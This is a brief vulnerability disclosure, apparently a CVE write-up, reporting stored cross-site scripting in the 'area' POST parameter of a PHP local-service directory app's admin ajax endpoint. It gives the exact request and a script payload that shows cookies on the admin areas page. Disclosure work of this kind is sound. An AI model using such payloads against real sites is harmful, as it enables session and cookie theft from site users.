# Local Service Search Engine Management System v1.0 has stored cross-site scripting

BUG_Author: sikii

Website source code address: https://www.sourcecodester.com/php/14607/local-service-search-engine-management-system-using-phpmysqli-source-code.html

Vulnerability File: /lssems/admin/ajax.php?action=save_area

POST parameter "area" exists stored cross-site scripting vulnerability

Payload: id=&area=<script>alert(document.cookie)</script>

![image](https://github.com/sikii7/CVE/blob/main/pic/xss1.png)

Payload will trigger when a user visits on http://localhost/lssems/admin/index.php?page=areas

![image](https://github.com/sikii7/CVE/blob/main/pic/xss2.png)
